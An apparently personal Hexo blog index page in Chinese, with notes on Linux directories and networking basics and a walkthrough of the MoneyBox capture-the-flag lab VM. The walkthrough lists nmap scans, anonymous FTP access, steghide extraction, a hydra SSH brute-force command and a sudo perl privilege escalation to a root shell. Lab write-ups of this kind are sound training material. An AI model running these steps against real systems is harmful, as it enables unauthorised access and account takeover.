<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-test-my-site" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/08/test-my-site/" class="article-date">
  <time class="dt-published" datetime="2024-01-08T09:48:43.000Z" itemprop="datePublished">2024-01-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/08/test-my-site/">test_my_site</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/08/test-my-site/" data-id="clr4ru46f0000ecfn4vuhbjnl" data-title="test_my_site" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Linux目录结构" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/08/Linux%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/" class="article-date">
  <time class="dt-published" datetime="2024-01-08T09:09:38.000Z" itemprop="datePublished">2024-01-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/08/Linux%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/">Linux目录结构</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Linux目录结构</p>
<p>基本介绍<br>1）linux 的文件系统是采用级层式的树状目录结构，在此结构中的最上层是根目录“&#x2F;”，然后在此目录下再创建其它的目录。<br>2)深刻理解linux树状文件目录是非常重要的。<br>3）记住经典的一句话；在linux世界中，一切皆文件<br>4）示意图</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081716034.png" alt="image-20240108171650576"></p>
<ol>
<li>2.具体的目录结构<br>1）&#x2F;bin  【常用】   （&#x2F;usr&#x2F;bin 、&#x2F;usr&#x2F;local&#x2F;bin）是Binary的缩小写，这个目录存放着经常使用的命令<br>2）&#x2F;sbin  (&#x2F;usr&#x2F;sbin、&#x2F;usr&#x2F;local&#x2F;sbin）s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。<br>3）&#x2F;home【常用】  存放普通用户的主目录，在Linux中每个用户都有一个自己的目录，一般该目录名是以用户的账号命名。<br>4）&#x2F;root 【常用】 该目录为系统管理员，也称作超级权限者的用户主目录<br>5）&#x2F;lib  系统开机所需要最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库<br>6）&#x2F;lsot+found 这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。<br>7）&#x2F;etc 【常用】所有的系统管理所需要的配置文件和子目录，比如安装mysql数据库my.conf<br>8）&#x2F;usr 【常用】这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似与Windows下的program files 目录。<br>9）&#x2F;boot 【常用】存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。<br>10）&#x2F;proc 【不能动】这个目录是一个虚拟的目录，它是系统内存的映射，访问这个目录来获取系统信息11) &#x2F;srv[不能动] service 缩写，该目录存放一些服务启动之后需要提取的数据</li>
</ol>
<ol start="12">
<li><p>&#x2F;sys [不能动]这是 linux2.6 内核的一个很大的变化。该目录下安装了 2.6 内核中新出现的一个文件系统 sysfs &#x3D;》[别]</p>
</li>
<li><p>&#x2F;tmp 这个目录是用来存放一些临时文件的</p>
</li>
<li><p>&#x2F;dev 类似于 windows 的设备管理器，把所有的硬件用文件的形式存储<br>15)&#x2F;media【常用】linux 系统会自动识别一些设备，例如 U 盘、光驱等等，当识别后，liux 会把识别的设备挂载到这个目录下</p>
</li>
<li><p>&#x2F;mnt【常用】系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将外部的存储挂载在&#x2F;mnt&#x2F;上，然后进入该目录就可以查看里的内容了。 d:&#x2F;myshare</p>
</li>
<li><p>&#x2F;opt 这是给主机额外安装软件所存放的目录。如安装 ORACLE 数据库就可放到该目录下。默认为空18) &#x2F;usr&#x2F;local[常用]<br>这是另一个给主机额外安装软件所安装的目录。一般是通过编译源码方式安装的程序</p>
</li>
<li><p>&#x2F;var 【常用】这个目录中存放着在不断扩充着的东西，习惯将经常被修改的目录放在这个目录下。包括各种日志文件</p>
</li>
<li><p>&#x2F;selinux[security-enhanced linux] SELinux 是一种安全子系统,它能控制程序只能访问特定文件，有三种工作模式，可以自行设置</p>
</li>
<li><p>&#x2F;var 【常用】这个目录中存放着在不断扩充着的东西，习惯将经常被修改的目录放在这个目录下。包括各种日志文件</p>
</li>
<li><p>&#x2F;selinux[security-enhanced linux] SELinux 是一种安全子系统,它能控制程序只能访问特定文件，有三种工作模式，可以自行设置</p>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/08/Linux%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/" data-id="clr4slxw70004qofn3brbdzvw" data-title="Linux目录结构" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-网络基础知识" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/08/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-date">
  <time class="dt-published" datetime="2024-01-08T09:09:04.000Z" itemprop="datePublished">2024-01-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/08/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">网络基础知识</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="一、Windows-IP-配置"><a href="#一、Windows-IP-配置" class="headerlink" title="一、Windows IP 配置"></a>一、Windows IP 配置</h4><h5 id="1-以太网适配器"><a href="#1-以太网适配器" class="headerlink" title="1. 以太网适配器"></a>1. 以太网适配器</h5><p>计算机与外界连接网络是通过主机箱插入一块网络接口板。网络接口板又称通信适配器或网络适配器或网络接口卡NIC，简单的名称为‘网卡’。</p>
<h5 id="2-以太网"><a href="#2-以太网" class="headerlink" title="2. 以太网"></a>2. 以太网</h5><p>有线网络</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081710663.png" alt="image-20240108171013228"></p>
<h4 id="3-虚拟网卡"><a href="#3-虚拟网卡" class="headerlink" title="3. 虚拟网卡"></a>3. 虚拟网卡</h4><p>以太网适配器VMware Network Adapter VMnet1、 VMware Network Adapter VMnet8</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081710659.png" alt="image-20240108171043292"></p>
<h4 id="4-无线局域网适配器-WLAN（即是wifi）"><a href="#4-无线局域网适配器-WLAN（即是wifi）" class="headerlink" title="4. 无线局域网适配器 WLAN（即是wifi）"></a>4. 无线局域网适配器 WLAN（即是wifi）</h4><p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081712090.png" alt="image-20240108171155335"></p>
<p>（1） <strong>ipv6</strong></p>
<p>​    也被称为IPng（IP Next Generation），也就是下一代IP协议。</p>
<ul>
<li>ipv6地址总长度为128比特，分为8组，每组为4个十六进制数的形式，每组十六进制数间隔。</li>
</ul>
<p> 例如：FC00:0000:130F:0000:0000:09C0:876A:130B</p>
<ul>
<li>ipv6地址缩写规则：</li>
</ul>
<p> 每组中的前导“0”都可以省略，即一组中全为0，则可以只写一个0，所以上述地址可写为：FC00:0:130F:0:0:9C0:876A:130B。</p>
<ul>
<li>地址中包含的连续两个或多个均为0的组，可以用双冒号“::”来代替</li>
</ul>
<p> 所以上述地址又可以进一步简写为：FC00:0:130F::9C0:876A:130B。</p>
<p>需要注意的是，在一个IPv6地址中只能使用一次双冒号“::”（一般用于0最多的一段）</p>
<p>  （2） <strong>ipv4</strong></p>
<ul>
<li>本地ip地址，IPv4 全称为 Internet Protocol version  4，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，IP 地址是一个 32 位的二进制数，算下来其实也只有 2^32  个地址，这些地址中有分为 A、B、C、D、E 5 类</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081712370.png" alt="image-20240108171236342"></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081713204.png" alt="image-20240108171304889"></p>
<p>特殊ip地址</p>
<p>（a） 广播地址</p>
<ul>
<li>一个子网内的所有网络接口都能收到此广播消息</li>
<li>直接广播：带目标网络号，主机地址二进制全为1的地址</li>
<li>有限广播：网络号和主机地址二进制全为1的地址（即255.255.255.255）</li>
</ul>
<p> （b）网络地址</p>
<ul>
<li><p>主机地址二进制全为0的地址 </p>
<p>如实际中常用的127.0.0.1，别名localhost</p>
</li>
<li><p>主要用于对本地回路测试及实现本地机器进程间的通信。</p>
<p><strong>子网技术</strong></p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081713437.png" alt="image-20240108171347481"></p>
<p>子网掩码</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081714443.png" alt="image-20240108171407347"></p>
<ul>
<li><p>子网掩码与 IP 地址相同，32位二进制数。对于子网掩码的取值，对应于 IP 地址，网络号和子网号的所有二进制位设置为1，主机号的所有二进制位设置为0。</p>
</li>
<li><p>子网掩码的表示方法</p>
</li>
<li><p>点分十进制：表示法与ip地址中相同</p>
</li>
<li><p>网络前缀标记法（网络地址位数）：从左到右连续的取网络号和子网号的位数来表示子网掩码。列如，一个子网掩码为255.255.0.0 的 B类网络地址 156.81.0.0，用网络前缀标记法表示为 156.81.0.0&#x2F;16。</p>
<p>(4)公网和私网</p>
</li>
<li><p>公网（外网) ip</p>
<ol>
<li><strong>公网地址也称为全球唯一IP地址，是指可以直接在Internet上访问的IP地址。这些地址由互联网注册机构分配，具有全球唯一性和全球可达性。</strong></li>
<li><strong>公网地址通常用于互联网上的服务器、路由器和其他网络设备。</strong>它们可以直接访问Internet上的其他设备，<strong>可以通过Internet进行通信和数据传输。</strong></li>
</ol>
</li>
<li><p>私网（内网) ip：</p>
<ol>
<li><p><strong>私网地址也称为局域网IP地址，是指在局域网内部使用的IP地址。</strong>它们不具有全球唯一性和全球可达性，<strong>只能在局域网内部使用。</strong></p>
</li>
<li><p><strong>私网地址通常用于组建局域网，例如家庭网络、企业内部网络、校园网络等。</strong>在局域网内部，可以通过私网地址进行设备间的通信和数据传输。但是，<strong>如果要访问Internet上的其他设备，必须通过路由器进行转发。</strong></p>
</li>
<li><p>私网的3类ip地址范围</p>
<p>A类地址:10.0.0.0~10.255.255.255</p>
<p>B类地址:172.16.0.0~172.31.255.255</p>
<p>C类地址:192.168.0.0~192.168.255.255</p>
<h4 id="二、IP访问过程"><a href="#二、IP访问过程" class="headerlink" title="二、IP访问过程"></a>二、IP访问过程</h4></li>
</ol>
</li>
</ul>
<img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081714537.png" alt="image-20240108171426366" style="zoom:50%;" />

<h2 id="1-云"><a href="#1-云" class="headerlink" title="1. 云"></a>1. 云</h2><p>一层一层上传，包括多个路由器、基站，发送至想访问的公网ip</p>
<h2 id="2-静态ip"><a href="#2-静态ip" class="headerlink" title="2. 静态ip"></a>2. 静态ip</h2><p>由路由器分配ip</p>
<h2 id="3-动态ip"><a href="#3-动态ip" class="headerlink" title="3. 动态ip"></a>3. 动态ip</h2><p>   <strong>动态IP的原理：</strong></p>
<p>   动态IP（Dynamic IP  Address）是由网络服务提供商（ISP）自动分配的一种IP地址，该IP地址一般具有较短的租用期限，因此每次重新连接网络时，其IP地址会发生变化。其原理是将一定数量的IP地址作为可用地址池，在进行动态IP地址分配的过程中，一般采用动态主机配置协议<strong>（DHCP）</strong>从地址池中选取一个可用地址与设备建立通信，并将该地址分配给设备，以使设备可以连接到互联网。</p>
<h2 id="4-当动态ip设置为静态ip时"><a href="#4-当动态ip设置为静态ip时" class="headerlink" title="4. 当动态ip设置为静态ip时"></a>4. 当动态ip设置为静态ip时</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>大概率是动态ip上不了网。（实际上什么情况都有可能发生，主要因路由器不同设置导致）</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081715857.png" alt="image-20240108171459555"></p>
<h2 id="5-socks5协议"><a href="#5-socks5协议" class="headerlink" title="5. socks5协议"></a>5. socks5协议</h2><p>是一种代理协议。Socks 5 协议工作在传输层 (Transport Layer) 与应用层 (Application Layer) 的中间, 提供了一种对应用层协议透明的代理服务。<strong>对于传输层协议仅支持 TCP 协议</strong></p>
<h2 id="6-OSI七层模型"><a href="#6-OSI七层模型" class="headerlink" title="6. OSI七层模型"></a>6. OSI七层模型</h2><p>   OSI七层模型是一种网络协议参考模型，用于描述和规范计算机网络中不同层次的功能和交互关系。它包括以下七层：</p>
<ul>
<li><p>1.物理层(Physical Layer):负责传输比特流，包括电器、光学和机械接口等物理特性。</p>
<p><strong>常见协议:Ethernet,RS-232,USB,光纤等</strong></p>
</li>
<li><p>2.数据链路层(Date Link Layer):负责在直接相连的节点之间传输帧，处理物理地址(MAC地址)和错误检测等。</p>
<p><strong>常见协议:Ethernet(IEEE 802.3),PPP(点对点协议),HDLC(高级数据链路控制),ARP(地址解析协议)等</strong></p>
</li>
<li><p>3.网络层(Network Layer):负责在不同网络之间传输数据包，处理逻辑地址（ip地址）和路由选择等。</p>
<p><strong>常见协议:IP(Internet协议)，ICMP(Internet控制消息协议),IPsec(IP安全性协议),OSPF(开放最短路径优先协议)等</strong></p>
</li>
<li><p>4.传输层(Transport Layer):负责端到端的可靠传输和流量控制，提供传输协议(如TCP、UDP)</p>
<p><strong>常见协议:TCP(传输控制协议)，UDP(用户数据报协议),SCIP(流控制传输协议)等</strong></p>
</li>
<li><p>5.会话层(Session Layer):负责建立、管理和终止会话，确保数据在通信系统中的同步。</p>
<p><strong>常见协议:NetBIOS(网络基本输入输出系统),RPC(远程过程调用协议),SSH(安全外壳协议)等</strong></p>
</li>
<li><p>6.表示层(Presentation Layer):负责数据的格式转换、数据加密和解密、数据压缩和解压缩等。</p>
<p><strong>常见协议:ACSII码,JPEG(联合图像专家组),MPEG(动态图像压缩标准)等</strong></p>
</li>
<li><p>7.应用层(Application Layer):负责应用程序之间的通信和数据交互，提供各种应用服务。</p>
<p><strong>常见协议:HTTP(超文本传输协议),FTP(文件传输协议),SMTP(简单邮件传输协议),DNS(域名系统)等</strong></p>
<p> 每一层都有自己的功能和协议，通过不同层次之间的协同工作，实现了网路通信的可靠性和灵活性。</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081715168.png" alt="image-20240108171517002"></p>
<p>路由器</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081715887.png" alt="image-20240108171528859"></p>
<ul>
<li>路由器可作为一个网络的划分，同一个路由器下的设备是互通的</li>
<li>路由器表会记录要访问的ip</li>
<li>源ip，源MAC，目的ip,目的MAC称为四象限</li>
<li>交换机：集线器的作用，把多个设备的信号集中输出到路由器上（类似快递员的作用）</li>
</ul>
<p>win操作系统和驱动</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081715220.png" alt="image-20240108171548084"></p>
<ul>
<li>操作系统是指控制和管理整个计算机系统的硬件和软件资源，并合理的组织和调度计算机的工作和资源的分配，以提供给用户和其它软件方便的接口和环境。</li>
<li>驱动是指驱动计算机里软件的程序，初始化和配置硬件，实现硬件的数据的接受和发送</li>
</ul>
<h2 id="9-NAT"><a href="#9-NAT" class="headerlink" title="9. NAT"></a>9. NAT</h2><p>进行地址转换,等同于路由器，输出是由物理机ip输出，nat外的ip是访问不了nat内的服务器。</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081716649.png" alt="image-20240108171601506"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/08/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" data-id="clr4slxwh000oqofn9qpka63o" data-title="网络基础知识" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-box靶机" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/08/box%E9%9D%B6%E6%9C%BA/" class="article-date">
  <time class="dt-published" datetime="2024-01-08T02:21:23.000Z" itemprop="datePublished">2024-01-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/08/box%E9%9D%B6%E6%9C%BA/">box靶机</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="下载Oracle-VMNVirtual-Box"><a href="#下载Oracle-VMNVirtual-Box" class="headerlink" title="下载Oracle VMNVirtual Box"></a>下载Oracle VMNVirtual Box</h1><p>可以理解为VMware mini</p>
<h1 id="下载menoy-box虚拟机"><a href="#下载menoy-box虚拟机" class="headerlink" title="下载menoy box虚拟机"></a>下载menoy box虚拟机</h1><p>虚拟机地址：</p>
<p><a target="_blank" rel="noopener" href="http://www.vulnhub.com/entry/moneybox-1,653/#download">http://www.vulnhub.com/entry/moneybox-1,653/#download</a></p>
<p>导入虚拟机，设置一下Oracle VMNVirtual Box，网络和usb设备需要设置，如下图</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081021805.png" alt="image-20240108102152562"></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081022320.png" alt="image-20240108102210219"></p>
<h1 id="kali设置"><a href="#kali设置" class="headerlink" title="kali设置"></a>kali设置</h1><p>1、编辑-虚拟网络编辑器</p>
<p>2、更改设置—–vment0桥接模式 virtualbox</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081022338.png" alt="image-20240108102230823"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifdown eth0          //关闭网卡</span><br><span class="line">ifup eth0            //开启网卡</span><br></pre></td></tr></table></figure>

<h1 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0 本地网络上执行ARP扫描。它将显示与您的eth0网络接口关联的本地IP地址和MAC地址的列表</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081023737.png" alt="image-20240108102346591"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.56.101</span><br><span class="line"></span><br><span class="line">nmap: 这是网络映射器（Network Mapper）的缩写，是一个用于网络发现和安全审计的开源工具。</span><br><span class="line">-p-: 这个选项指示Nmap扫描所有可能的端口，而不是只扫描一些常见的端口。在这里，连字符（-）表示范围，而没有具体的端口号，因此表示扫描所有1到65535的端口。</span><br><span class="line">192.168.56.101: 这是目标主机的IP地址，是要进行端口扫描的目标。</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081024108.png" alt="image-20240108102437132"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 21,22,80 -sC 192.168.56.101 -p 21,22,80: 这个选项指示Nmap只扫描指定的端口，这里是21（FTP）、22（SSH）、80（HTTP）。逗号分隔的端口列表表示仅扫描这些端口。 -sC: 这个选项启用了默认的脚本扫描。Nmap脚本引擎允许用户运行一系列脚本，以执行各种任务，如服务识别、漏洞探测等。</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081025075.png" alt="image-20240108102510865"></p>
<p>发现ftp拥有允许匿名ftp登录的漏洞，Anonymous:Anonymous登录</p>
<p>下载文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.101    --使用FTP（文件传输协议）连接到位于IP地址为192.168.56.101的主机 ls help</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081025409.png" alt="image-20240108102533376"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get trytofind.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081025902.png" alt="image-20240108102552939"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings trytofind.jpg   strings trytofind.jpg 是一个命令行工具的使用，用于从文件中提取可打印字符序列，通常用于查看二进制文件中的文本信息。</span><br><span class="line">steghide info trytofind.jpg steghide 是一个用于隐藏数据在图像中的工具。steghide info 命令用于检索图像中隐藏的信息，但仅适用于使用 Steghide 工具进行隐藏的数据</span><br></pre></td></tr></table></figure>

<p>发现的确藏了文件，但是缺少一个密钥，去访问下80端口吧</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081026249.png" alt="image-20240108102618301"></p>
<p>没有什么东西</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.56.101  -x 403,404,401 -u 192.168.56.101: 指定目标URL或IP地址，即要进行目录和文件枚举的目标web服务器的地址。 -x 403,404,401: 指定要排除的HTTP响应代码。</span><br></pre></td></tr></table></figure>

<p>访问<a target="_blank" rel="noopener" href="http://192.168.56.101/blogs/">http://192.168.56.101/blogs/</a></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081026330.png" alt="image-20240108102649132"></p>
<p>右键点击查看源代码</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081027938.png" alt="image-20240108102706012"></p>
<p>有一个提示，把网址改成上述提示的</p>
<p>访问S3cr3t-T3xt<br>192.168.56.101&#x2F;S3cr3t-T3xt&#x2F;</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081027122.png" alt="image-20240108102723111"></p>
<p>我们可以看到出现了一个密钥，输入到之前缺少密钥的页面</p>
<p>key:3xtr4ctd4t4</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081426018.png" alt="image-20240108102752528"></p>
<p>先安装一个插件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install steghide</span><br><span class="line">steghide info trytofind.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081426374.png" alt="image-20240108102809476"></p>
<p>榨取图片中的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide  extract -sf trytofind.jpg steghide: 这是 steghide 工具的执行命令。 extract: 这是 steghide 工具的子命令，表示你想要从图像中提取隐藏的数据。 -sf trytofind.jpg: 这个选项指定要操作的源文件。</span><br></pre></td></tr></table></figure>

<p>查看剥离出的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你好，雷洛 我告诉你一件很重要的事。你的密码太弱了，所以改一下吧！不要低估它…… 说明renu密码可能是弱密码</span><br></pre></td></tr></table></figure>

<p>Hydra 工具，它是一个用于暴力破解各种网络协议的密码的工具。这个具体的命令用于尝试通过 SSH 协议暴力破解给定主机上的用户名和密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l renu -P rockyou.txt   192.168.56.101 ssh     -- cp /usr/share/wordlists/rockyou.txt.gz .        --gunzip rockyou.txt.gz     //这是个超大的密码字典    --echo  root &gt; user.txt</span><br></pre></td></tr></table></figure>

<p>我们已经知道renu的名字，直接可以指定用户名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh renu@192.168.56.101    --使用 SSH（Secure Shell）协议来建立到目标主机的安全连接 ls cat user1.txt          //获得一个flag cat .bash_history      //查看历史命令</span><br></pre></td></tr></table></figure>

<p>根据历史命令判断，当前renu账户可以通过ssh免密登录lily账户</p>
<p>发现新的flag</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081426202.png" alt="image-20240108103028933"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh lily@192.168.56.101</span><br></pre></td></tr></table></figure>

<p>进入到lily的账户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls cat user2.txt</span><br></pre></td></tr></table></figure>

<p>发现了第二个flag，下一个flag的话，可能在root用户里面，我们需要提升权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l sudo perl -e &#x27;exec &quot;/bin/bash&quot;;&#x27; id</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 搜索perl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root                //切换到root的目录下 ls -al cat .root.txt</span><br></pre></td></tr></table></figure>

<p>完成实验，三个flag都找到了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/08/box%E9%9D%B6%E6%9C%BA/" data-id="clr4slxw90007qofn27wmhs1k" data-title="box靶机" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-逻辑漏洞之支付漏洞详解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/08/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2024-01-08T02:19:10.000Z" itemprop="datePublished">2024-01-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/08/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/">逻辑漏洞之支付漏洞详解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
